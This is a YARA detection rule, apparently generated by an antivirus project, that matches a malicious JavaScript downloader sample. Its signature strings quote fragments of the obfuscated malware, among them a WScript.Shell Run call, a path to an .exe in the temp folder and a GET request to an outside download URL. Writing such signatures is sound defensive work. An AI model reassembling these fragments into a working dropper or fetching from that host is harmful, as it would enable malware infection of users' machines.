rule sig_20160328_2d3e758e497e5b487b7fb57e151b3a87 {
  meta:
    description = "datamaliciousorder - file 20160328_2d3e758e497e5b487b7fb57e151b3a87.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "446309a09cd0b4c6c233c01a4d69ccd54d3c43e267b6b34256c0ef9ee95f6e76"

  strings:
    $s1  = "function Siozyhw() {return Ikugkluqq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yZfgOr45JJvpUIRT.exe\";};" fullword ascii
    $s2  = "do {WScript[Qrikgzyvkp](Ladjfsmqd() * 11)} while (Kvttjh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Kvttjh[Ykfjycth](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s4  = "var Ikugkluqq = function Tfdqvcm() {return WScript[Qymeifopr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Bhzewfqgd(Nhhjrj, Ojcbrmxkgn){return Nhhjrj - Ojcbrmxkgn;};" fullword ascii
    $s6  = "function Vpufive(Vdeospslis){Ikugkluqq[\"Run\"](Vdeospslis, Fwnsrpkwt, Fwnsrpkwt);};" fullword ascii
    $s7  = "function Kcgpsde() {return ((Cerdglku == true) && (Cerdglku == Jhmjaohvm)) ? 1 : Fwnsrpkwt;};" fullword ascii
    $s8  = "var Cerdglku = false;" fullword ascii
    $s9  = "Jhmjaohvm = true; " fullword ascii
    $s10 = "function Irkxlvaen(){return Qymeifopr;};" fullword ascii
    $s11 = "Cerdglku = true; " fullword ascii
    $s12 = "var Jhmjaohvm = false;" fullword ascii
    $s13 = "var Dqbzshiol = false;" fullword ascii
    $s14 = "return Bhzewfqgd(Kizrba, Dgntjsfcmt);" fullword ascii
    $s15 = "function Xlzef(){return Wnorlyn;};" fullword ascii
    $s16 = "function Pgilkbo(Hozfrjwhxd) {var Ebahejo = (1, 2, 3, 4, 5, Hozfrjwhxd); return Ebahejo;};" fullword ascii
    $s17 = "var Xgrux = new this[\"Date\"]();" fullword ascii
    $s18 = "function Rxjslcpa()" fullword ascii
    $s19 = "function Ladjfsmqd(){return 22;};" fullword ascii
    $s20 = " while (Hoojrf){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}